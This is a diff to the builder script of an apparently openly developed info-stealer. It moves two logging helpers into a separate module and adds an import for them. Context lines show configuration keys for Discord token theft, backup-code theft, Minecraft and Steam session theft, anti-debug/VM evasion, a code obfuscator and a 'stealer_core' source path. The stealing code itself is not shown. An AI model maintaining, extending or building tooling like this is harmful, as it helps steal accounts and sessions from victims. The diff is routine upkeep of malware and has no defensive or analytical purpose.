@@ -21,6 +21,7 @@ from datetime import *
 from plyer import notification
 
 from utils.module.Obfuscators import Obfuscators # Restored because obfscator was not the problem
+from utils.module.logger import log_debug, timestamp
 
 os.system("cls")
 obf = Obfuscators(include_imports=True, recursion=5)
@@ -29,14 +30,6 @@ version = "v1.32.2"
 CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam"]
 ENABLE_KEYS = ["Anti Debug / VM","Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal"]
 PATH = "src/stealer_core/src.py"
-
-def timestamp():
-    now = datetime.now()
-    return f"{Fore.CYAN}[{now.hour}:{now.minute}:{now.second}]{Fore.RESET} "
-
-def log_debug(message):
-    username = getpass.getuser()
-    print(f"{timestamp()}{Fore.GREEN}DEBUG {Fore.LIGHTBLACK_EX}(User: {username}) {Fore.RESET}{message}")
 
 print(Fore.LIGHTMAGENTA_EX + Center.XCenter("""
  __          ___ _       _     
